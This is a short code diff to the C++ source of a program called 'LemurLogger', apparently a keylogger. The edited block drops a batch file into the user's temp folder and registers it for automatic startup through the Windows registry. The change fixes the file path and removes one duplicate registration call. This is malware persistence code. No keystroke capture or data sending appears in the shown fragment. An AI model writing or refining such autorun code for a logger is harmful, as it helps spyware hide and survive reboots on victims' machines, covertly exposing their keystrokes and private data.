@@ -45,7 +45,7 @@ int main()
     }
     if(filename == "LemurLogger.exe"|| filename =="LemurLogger")
 	   {
-            std::string batname = "batLLog.bat";
+            std::string batname = "\\batLLog.bat";
 		    char* temp = getenv("temp");
 		    std::string temp_dir(temp);
             std::string batpath = temp_dir+batname;
@@ -53,7 +53,6 @@ int main()
                     //shell_cmd()
                     //startup(fullpath.c_str());
                     Registry::RegisterProgram2(batname,batpath);
-    	            Registry::RegisterProgram();
             }
 
 
